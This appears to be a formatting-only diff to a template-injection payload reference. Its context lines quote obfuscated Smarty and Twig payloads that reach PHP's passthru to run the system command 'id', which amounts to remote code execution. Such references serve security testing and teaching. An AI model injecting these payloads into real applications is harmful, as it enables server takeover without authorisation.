@@ -66,6 +66,7 @@ Reference and explanation of payload can be found [here](https://www.yeswehack.c
 By employing the variable modifier `cat`, individual characters are concatenated to form the string "id" as follows: `{chr(105)|cat:chr(100)}`.
 
 Execute system comman (command: `id`):
+
 ```php
 {{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
 ```
@@ -149,6 +150,7 @@ Twig's block feature and built-in `_charset` variable can be nesting can be used
 ```
 
 The following payload, which harnesses the built-in `_context` variable, also achieves RCE – provided that the template engine performs a double-rendering process:
+
 ```twig
 {{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
 ```
